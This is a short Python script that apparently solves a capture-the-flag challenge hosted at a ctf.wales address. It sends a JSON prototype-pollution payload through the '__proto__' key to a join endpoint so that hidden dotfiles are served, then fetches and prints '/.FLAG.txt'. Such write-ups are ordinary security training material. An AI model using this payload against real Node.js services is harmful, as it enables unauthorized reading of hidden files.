import requests
import sys
from time import sleep

CHALL_HOST = 'jaas.ctf.wales:3000' # 

payload = '{"obj1":{},"obj2":{"__proto__": {"__proto__": 1, "dotfiles": "allow"}}}'

res = requests.post(f'http://{CHALL_HOST}/join', headers={'Content-Type': 'application/json'}, data=payload)

assert '"success":true' in res.text

sleep(2)

res = requests.get(f'http://{CHALL_HOST}/.FLAG.txt')

assert 'SCSC{' in res.text

print(res.text.strip())
